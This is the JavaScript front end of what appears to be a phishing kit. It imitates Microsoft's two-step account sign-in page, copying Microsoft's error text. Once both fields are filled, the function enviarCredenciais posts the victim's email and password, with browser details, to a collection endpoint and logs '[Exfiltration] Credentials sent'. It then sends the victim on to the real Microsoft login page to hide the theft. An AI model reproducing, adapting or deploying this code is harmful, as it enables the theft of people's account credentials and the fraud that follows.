document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    let unameVal = pwdVal = false;

    // Previne submit dos forms (Enter key)
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', (e) => {
            e.preventDefault();
        });
    });

    // Enter no campo de email -> clica Next
    unameInp.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            document.getElementById('btn_next').click();
        }
    });

    // Enter no campo de senha -> clica Sign in
    pwdInp.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            document.getElementById('btn_sig').click();
        }
    });

    // Next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity, #user_identity_final').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "pwd";
        }
    })

    // Sign in button
    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";

            // Envia credenciais capturadas para o servidor
            enviarCredenciais(unameInp.value, pwdInp.value);
        }
    })

    function enviarCredenciais(email, senha) {
        // Envia as credenciais completas para o servidor
        fetch('/api/salvar-client', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessao: 'microsoft_login_' + Date.now(),
                dados: [
                    { tipo: 'credential', campo: 'email', tecla: email, timestamp: new Date().toISOString() },
                    { tipo: 'credential', campo: 'password', tecla: senha, timestamp: new Date().toISOString() }
                ],
                navegador: navigator.userAgent,
                plataforma: navigator.platform
            })
        }).then(r => r.json())
          .then(data => console.log('[Exfiltration] Credentials sent'))
          .catch(e => console.log('[Exfiltration] Error:', e));
    }

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }
        }

        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        }
        return false;
    }

    // Back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })

    // Final buttons - redireciona pro login oficial da Microsoft
    document.getElementById('btn_final_no').addEventListener('click', () => {
        try { window.top.location.replace('https://login.live.com'); }
        catch(e) { window.open('https://login.live.com', '_top'); }
    })

    document.getElementById('btn_final_yes').addEventListener('click', () => {
        try { window.top.location.replace('https://login.live.com'); }
        catch(e) { window.open('https://login.live.com', '_top'); }
    })
})
